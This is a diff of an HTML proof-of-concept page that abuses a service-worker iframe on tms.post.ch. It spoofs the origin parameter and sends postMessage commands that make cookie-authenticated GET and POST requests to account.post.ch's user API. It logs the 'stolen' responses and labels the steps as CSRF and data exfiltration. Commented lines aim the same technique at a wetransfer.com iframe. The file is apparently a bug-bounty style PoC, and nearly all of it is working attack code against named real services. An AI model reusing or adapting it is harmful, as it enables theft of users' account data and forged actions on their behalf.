@@ -1,83 +1,73 @@
-<!DOCTYPE html>
 <html>
 
 <head>
-    <title>SW Fetch Proxy PoC</title>
+    <meta charset="UTF-8" />
+    <title>postMessage demo with open window</title>
 </head>
 
 <body>
-    <h2>TMS Service Worker Cookie-Authenticated Fetch Proxy</h2>
-    <pre id="output"></pre>
-    <script>
-        const TARGET_SW_IFRAME = 'https://tms.post.ch/_/service_worker/63b0/sw_iframe.html?origin=' +
-            encodeURIComponent(window.location.origin);
+    <!-- <button id="send">Open Page and Send Message</button> -->
+    <!-- <iframe id="targetFrame" src="https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=http://127.0.0.1&path=badr" style="width:100%; height:500px;"></iframe> -->
 
+    <script>
+        // 1. Create iframe with spoofed origin
         const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = TARGET_SW_IFRAME;
+        // iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me&1p=1';
+        iframe.src = 'https://tms.post.ch/_/service_worker/63b0/sw_iframe.html?origin=https://poc1337.xyz&1p=1'
         document.body.appendChild(iframe);
 
-        // Listen for responses from SW iframe
-        window.addEventListener('message', function(e) {
-            if (e.origin === 'https://tms.post.ch') {
-                document.getElementById('output').textContent +=
-                    'Response: ' + JSON.stringify(e.data, null, 2) + '\n';
+        iframe.onload = () => {
+            try {
+                console.debug('[DEBUG] iframe loaded:', iframe.src);
+                // 2. Send command to exfiltrate data
+                const collectUrl = `https://account.post.ch/selfadmin/api/secure/v1/user/`;
+                const collectMsg = {
+                    type: 1,
+                    clientId: 'attacker-client',
+                    command: {
+                        commandType: 0,
+                        params: {
+                            url: collectUrl,
+                            method: 0, //GET
+                            credentials: 'include',
+                            templates: {},
+                            processResponse: true
+                        }
+                    }
+                };
+                console.debug('[DEBUG] Sending collect message:', collectMsg);
+                iframe.contentWindow.postMessage(collectMsg, '*');
 
-                // If type 1 response with result, we got authenticated data back
-                if (e.data && e.data.result && e.data.result.data) {
-                    document.getElementById('output').textContent +=
-                        '\n=== EXFILTRATED DATA ===\n' + e.data.result.data + '\n';
-                }
+                // 3. Or send tracking request with victim's cookies
+                const stealMsg = {
+                    type: 1,
+                    clientId: 'attacker-client',
+                    command: {
+                        commandType: 0,
+                        params: {
+                            url: 'https://account.post.ch/selfadmin/api/tizz',
+                            method: 1, // POST
+                            body: 'victim_data=sensitive',
+                            credentials: 'include'
+                        }
+                    }
+                };
+                console.debug('[DEBUG] Sending steal message:', stealMsg);
+                iframe.contentWindow.postMessage(stealMsg, '*');
+            } catch (err) {
+                console.error('[ERROR] Failed to send postMessage:', err);
+            }
+        };
+
+        // 4. Listen for responses
+        window.addEventListener('message', (e) => {
+            console.debug('[DEBUG] Received message event:', e);
+            if (e.origin !== 'https://tms.post.ch') {
+                console.log('[INFO] Stolen data:', e.data);
+            } else {
+                console.log('[INFO] Message from trusted origin:', e.data);
             }
         });
-
-        // Wait for SW to initialize, then send commands
-        setTimeout(() => {
-            // Step 1: Send heartbeat to establish connection
-            iframe.contentWindow.postMessage({
-                type: 0,
-                clientId: 'attacker-' + Math.random().toString(36).slice(2),
-                requestId: 'hb-1',
-                maxDelay: 5000
-            }, 'https://tms.post.ch');
-        }, 3000);
-
-        setTimeout(() => {
-            const clientId = 'attacker-' + Math.random().toString(36).slice(2);
-
-            // Step 2: CSRF — make authenticated POST request (fire-and-forget)
-            iframe.contentWindow.postMessage({
-                type: 1,
-                clientId: clientId,
-                requestId: 'csrf-1',
-                command: {
-                    commandType: 0,
-                    params: {
-                        url: 'https://account.post.ch/selfadmin/api/some-action',
-                        method: 1, // POST
-                        body: '{"action":"attacker-controlled"}',
-                        processResponse: false,
-                        templates: {}
-                    }
-                }
-            }, 'https://tms.post.ch');
-
-            // Step 3: Data exfiltration — read response (requires CORS on target)
-            iframe.contentWindow.postMessage({
-                type: 1,
-                clientId: clientId,
-                requestId: 'exfil-1',
-                command: {
-                    commandType: 0,
-                    params: {
-                        url: 'https://tms.post.ch/gtm.js', // Same-origin, always readable
-                        method: 0, // GET
-                        processResponse: true,
-                        templates: {}
-                    }
-                }
-            }, 'https://tms.post.ch');
-        }, 5000);
     </script>
 </body>
 
